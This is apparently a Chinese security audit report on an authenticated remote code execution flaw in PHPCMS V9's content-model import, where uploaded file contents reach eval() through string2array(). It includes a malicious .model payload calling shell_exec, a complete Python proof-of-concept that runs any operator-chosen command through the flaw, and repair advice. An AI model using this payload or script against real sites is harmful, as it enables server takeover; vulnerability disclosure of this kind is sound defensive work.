# PHPCMS V9 内容模型导入导致任意 PHP 代码执行

审计日期：2026-04-18  
目标项目：`D:\phpstudy_pro\WWW\phpcms_v9.6.3_UTF8\phpcms_v9_UTF8\install_package`  
分析目标：后台内容模型导入功能 `index.php?m=content&c=sitemodel&a=import` 的任意代码执行形成链路、代码级成因与动态验证结果。

## 1. 结论摘要

该漏洞的根因不是“上传扩展名校验不足”，而是后台内容模型导入功能把上传文件内容整段读入后，直接交给 `string2array()` 处理，而 `string2array()` 在检测到字符串以 `array` 开头时会执行 `eval()`。

完整漏洞形成链路如下：

1. 后台管理员访问内容模型导入页
2. 上传 `.model` 文件
3. `sitemodel::import()` 使用 `file_get_contents()` 读取整个文件内容
4. 读取结果进入 `string2array($model_import)`
5. `string2array()` 命中 `strpos($data, 'array')===0`
6. 执行 `@eval("\$array = $data;");`
7. 上传文件中拼接的任意 PHP 语句在服务器端执行

这条链路与模型字段是否合法、后续建表是否成功没有本质关系。只要执行流进入 `eval()`，任意 PHP 代码就已经运行。

## 2. 漏洞入口

漏洞入口位于：

- `phpcms/modules/content/sitemodel.php`

目标方法：

- `sitemodel::import()`

关键代码：

- `phpcms/modules/content/sitemodel.php:210-213`

  ![image-20260418002059953](./../../source/imgs/phpcms-member-model-import-rce/image-20260418002059953.png)

```php
if(!empty($_FILES['model_import']['tmp_name'])) {
    $model_import = @file_get_contents($_FILES['model_import']['tmp_name']);
    if(!empty($model_import)) {
        $model_import_data = string2array($model_import);				
    }
}
```

这里的危险点有三个：

1. 上传文件不是安全结构化解析，而是整文件字符串读取
2. 没有对模型文件格式做白名单校验
3. 读取结果直接进入危险函数 `string2array()`

## 3. 危险 Sink

危险函数位于：

- `phpcms/libs/functions/global.func.php:289-294`

  ![image-20260418002146448](./../../source/imgs/phpcms-member-model-import-rce/image-20260418002146448.png)

```php
function string2array($data) {
    $data = trim($data);
    if($data == '') return array();
    if(strpos($data, 'array')===0){
        @eval("\$array = $data;");
    }else{
        ...
    }
    return $array;
}
```

这段逻辑的实际含义是：

- 只要导入文件内容以 `array` 开头
- 程序就会把整段内容当作 PHP 代码执行

所以这里不是“反序列化风险”，而是明确的 `eval` 型代码执行。

## 4. 代码层漏洞如何形成

当前用于动态验证的恶意模型文件为：

- `content_model_whoami.model`

内容如下：

```php
array();file_put_contents(PHPCMS_PATH.'uploadfile/content_model_whoami.txt',trim(shell_exec('whoami 2>&1')));//
```

程序进入如下代码：

```php
@eval("\$array = $data;");
```

后，等价执行效果为：

```php
$array = array();
file_put_contents(
    PHPCMS_PATH.'uploadfile/content_model_whoami.txt',
    trim(shell_exec('whoami 2>&1'))
);
```

也就是说，攻击者不仅能执行任意 PHP 语句，还能进一步调用：

- `shell_exec`
- `system`
- `exec`

等系统命令执行函数，最终实现操作系统命令执行。

## 5. 为什么后续模型导入流程不影响利用

`sitemodel::import()` 在 `string2array()` 之后还有：

- 模型表创建
- 模型字段遍历
- 缓存更新

但这些步骤都发生在 `eval()` 之后。

因此：

1. 利用是否成功，不依赖模型文件是否为合法结构
2. 即使后续字段处理报错，前面注入的 PHP 语句也已经执行
3. 该漏洞是“前置代码执行”，不是“后置副作用”

## 6. 动态验证结果

当前推荐使用的 Python PoC 为：

- `verify_content_model_import_standalone.py`

  ```
  import argparse
  import sys
  import uuid
  from pathlib import Path
  from urllib import request
  
  
  def php_single_quote_escape(value: str) -> str:
      return value.replace("\\", "\\\\").replace("'", "\\'")
  
  
  def build_multipart(fields: dict[str, str], files: list[tuple[str, str, bytes, str]], boundary: str) -> bytes:
      body = bytearray()
  
      for name, value in fields.items():
          body.extend(f"--{boundary}\r\n".encode("utf-8"))
          body.extend(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode("utf-8"))
          body.extend(value.encode("utf-8"))
          body.extend(b"\r\n")
  
      for field_name, filename, content, mime_type in files:
          body.extend(f"--{boundary}\r\n".encode("utf-8"))
          body.extend(
              f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'.encode("utf-8")
          )
          body.extend(f"Content-Type: {mime_type}\r\n\r\n".encode("utf-8"))
          body.extend(content)
          body.extend(b"\r\n")
  
      body.extend(f"--{boundary}--\r\n".encode("utf-8"))
      return bytes(body)
  
  
  def http_request(url: str, *, method: str = "GET", data: bytes | None = None, cookie: str, content_type: str | None = None) -> str:
      headers = {
          "User-Agent": "phpcms-cve-standalone/1.0",
          "Cookie": cookie,
      }
      if content_type:
          headers["Content-Type"] = content_type
      req = request.Request(url, data=data, method=method, headers=headers)
      with request.urlopen(req, timeout=30) as resp:
          return resp.read().decode("utf-8", "replace")
  
  
  def main() -> int:
      parser = argparse.ArgumentParser(
          description="PHPCMS V9 内容模型导入 RCE 独立 PoC，不依赖 common.py。"
      )
      parser.add_argument(
          "--base-url",
          default="http://localhost:8088",
          help="目标站点地址，默认 http://localhost:8088",
      )
      parser.add_argument(
          "--cookie",
          required=True,
          help="已登录后台管理员的完整 Cookie 头，直接从浏览器开发者工具复制。",
      )
      parser.add_argument(
          "--pc-hash",
          required=True,
          help="后台 URL 中的 pc_hash 参数值。",
      )
      parser.add_argument(
          "--cmd",
          default="whoami",
          help="要执行的命令，默认 whoami。",
      )
      parser.add_argument(
          "--marker",
          default="",
          help="结果文件名，默认自动生成。",
      )
      args = parser.parse_args()
  
      token = uuid.uuid4().hex[:8]
      model_name = f"AuditStandalone{token}"
      table_name = f"audit_standalone_{token}"
      marker = args.marker or f"standalone_{token}.txt"
  
      escaped_marker = php_single_quote_escape(marker)
      escaped_cmd = php_single_quote_escape(args.cmd)
      payload = (
          "array();"
          f"file_put_contents(PHPCMS_PATH.'uploadfile/{escaped_marker}',"
          f"trim(shell_exec('{escaped_cmd} 2>&1')));"
          "//"
      )
  
      fields = {
          "dosubmit": "1",
          "info[modelname]": model_name,
          "info[tablename]": table_name,
          "info[description]": "standalone-poc",
          "default_style": "default",
          "setting[category_template]": "category",
          "setting[list_template]": "list",
          "setting[show_template]": "show",
      }
      boundary = f"----phpcmsStandalone{uuid.uuid4().hex}"
      multipart = build_multipart(
          fields,
          [("model_import", "standalone.model", payload.encode("utf-8"), "application/octet-stream")],
          boundary,
      )
  
      import_url = f"{args.base_url}/index.php?m=content&c=sitemodel&a=import&pc_hash={args.pc_hash}"
      marker_url = f"{args.base_url}/uploadfile/{marker}"
  
      print(f"[+] 使用模型名: {model_name}")
      print(f"[+] 使用表名: {table_name}")
      print(f"[+] 结果文件: {marker}")
      print(f"[+] 上传请求: {import_url}")
  
      try:
          http_request(
              import_url,
              method="POST",
              data=multipart,
              cookie=args.cookie,
              content_type=f"multipart/form-data; boundary={boundary}",
          )
      except Exception as exc:
          print(f"[-] 上传失败: {exc}")
          return 1
  
      print(f"[+] 已触发导入，开始读取结果: {marker_url}")
  
      try:
          result = http_request(marker_url, cookie=args.cookie)
      except Exception as exc:
          print(f"[-] 读取结果失败: {exc}")
          print("[*] 如果导入已经成功，请手工访问上述 marker_url 查看结果。")
          return 1
  
      print("[+] 命令执行结果:")
      print(result.strip())
      print("[*] 说明: 该脚本不会自动删除导入出的临时模型和结果文件，请在后台手工清理。")
      return 0
  
  
  if __name__ == "__main__":
      sys.exit(main())
  ```

执行方式：

```bash
python verify_content_model_import_standalone.py --cookie "PHPSESSID=0ndoapbuctql1o3a3g7i25l4m1;IwzGl_userid=5872szzCJlzw_213lnWXbd0vhJhkBPtFCMDIt7Kd;IwzGl_admin_username=5363a3ODrtZNA-TBqx33tq5LXflmJVBB8TyvwpV8FOtzCGY;IwzGl_siteid=c83b6sRnFUav5MNeLM74Xm5WE641fUB98aTTpPLy;IwzGl_sys_lang=e66ch4ey_Y-ootOPY6_Tp6k9IITP3R-C8TaMIDxcODzYWQ;IwzGl_admin_email=94d5RFXB9SqdJK9U3E5DWdIaoYFUb9zre_jOzJWSWn6CaWG3m_Tq1g" --pc-hash "W4GgAa" --cmd whoami
```

![image-20260418005153897](./../../source/imgs/phpcms-member-model-import-rce/image-20260418005153897.png)

填充你后台登陆后的相关数据

![image-20260418005225073](./../../source/imgs/phpcms-member-model-import-rce/image-20260418005225073.png)



脚本行为如下：

1. 生成一个临时恶意 .model 内容
  2. 通过你提供的后台登录态，向：
     index.php?m=content&c=sitemodel&a=import
     发起文件上传
  3. 服务端触发 eval() 执行你指定的命令
  4. 把结果写到 uploadfile/standalone_xxx.txt
  5. 再去读取这个文件并打印结果

实测输出为：

```text
desktop-j0vdgoi\dgh
```

这说明当前 PHP 进程上下文已经执行了系统命令 `whoami`，漏洞不仅是“任意 PHP 代码执行”，而且已经到达“操作系统命令执行”层面。

**手工利用**

![image-20260418005726268](./../../source/imgs/phpcms-member-model-import-rce/image-20260418005726268.png)

![image-20260418005755504](./../../source/imgs/phpcms-member-model-import-rce/image-20260418005755504.png)

上传我们的恶意.model文件

```
array();file_put_contents(PHPCMS_PATH.'uploadfile/content_model_whoami.txt',trim(shell_exec('whoami 2>&1')));//
```

然后访问uploadfile/content_model_whoami.txt文件即可看到执行结果

![image-20260418005929784](./../../source/imgs/phpcms-member-model-import-rce/image-20260418005929784.png)

## 8. 风险判断

该问题满足以下特征：

- 后台已认证任意 PHP 代码执行
- 可进一步到达系统命令执行
- 根因明确，利用链稳定
- 与部署环境弱相关

这属于典型高危 RCE

## 9. 修复建议

1. 彻底删除 `string2array()` 中的 `eval`
2. 模型导入格式改为 JSON 或其他不可执行格式
3. 对导入文件做严格 schema 校验
4. 对内容模型导入功能增加更细粒度权限控制
5. 对后台导入类高危功能增加审计日志与二次确认